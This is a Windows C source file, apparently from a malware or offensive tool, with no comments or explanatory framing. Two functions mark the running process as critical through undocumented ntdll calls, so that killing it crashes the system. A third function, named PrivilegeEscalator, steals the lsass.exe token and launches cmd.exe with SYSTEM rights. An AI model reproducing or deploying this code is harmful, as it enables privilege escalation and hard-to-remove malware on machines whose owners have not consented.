#include "dec.h"

int Critical_RtlSetProcessIsCritical() {
	HMODULE hnd = LoadLibrary(L"ntdll.dll");

	if (hnd == 0)
		return 1;

	pfRtlSetProcessIsCritical RtlSetProcessIsCritical = (pfRtlSetProcessIsCritical)GetProcAddress(hnd, "RtlSetProcessIsCritical");

	ProcessSetPrivilege(SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED);

	RtlSetProcessIsCritical(TRUE, NULL, FALSE);

	ProcessSetPrivilege(SE_DEBUG_NAME, 0);
	FreeLibrary(hnd);

	return 0;
}

int Critical_NtSetInformationProcess() {	
	HMODULE hnd = LoadLibrary(L"ntdll.dll");
	ULONG ue = 1;

	if (hnd == 0)
		return 1;

	pfNtSetInformationProcess NtSetInformationProcess = (pfNtSetInformationProcess)GetProcAddress(hnd, "NtSetInformationProcess");

	ProcessSetPrivilege(SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED);

	NtSetInformationProcess(GetCurrentProcess(), 29, &ue, sizeof(ULONG));

	ProcessSetPrivilege(SE_DEBUG_NAME, 0);
	FreeLibrary(hnd);

	return 0;
}

int PrivilegeEscalator() {
	HANDLE ht;
	HANDLE hdt;
	HANDLE hdp;
	DWORD dwPid = LookupProcessID(L"lsass.exe");;
	PROCESS_INFORMATION pio;
	STARTUPINFO si = { sizeof(STARTUPINFO) };

	ProcessSetPrivilege(SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED);

	hdp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid);

	if (hdp == NULL)
		return 1;

	if(OpenProcessToken(hdp, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &ht) == 0)
		return 1;

	if (ImpersonateLoggedOnUser(ht) == 0)
		return 1;

	DuplicateTokenEx(ht, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hdt);

	if (CreateProcessWithTokenW(hdt, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pio) == 0)
		return 1;

	ProcessSetPrivilege(SE_DEBUG_NAME, 0);

	return 0;
}